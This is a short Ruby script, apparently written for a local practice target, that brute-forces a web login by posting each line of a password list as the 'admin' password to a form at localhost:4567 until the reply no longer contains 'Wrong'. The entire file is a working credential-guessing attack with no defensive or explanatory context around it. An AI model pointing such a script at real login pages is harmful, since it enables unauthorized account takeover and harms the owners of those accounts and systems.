require 'net/http'

uri = URI('http://localhost:4567/login')

File.new('passwords.txt').each do |line|
 password = line.chomp
 puts "Trying #{password}..."
 res = Net::HTTP.post_form(uri, username: 'admin', password: password)

 unless res.body.include?('Wrong')
  puts "Passwords found: #{password}"
  exit
 end
end
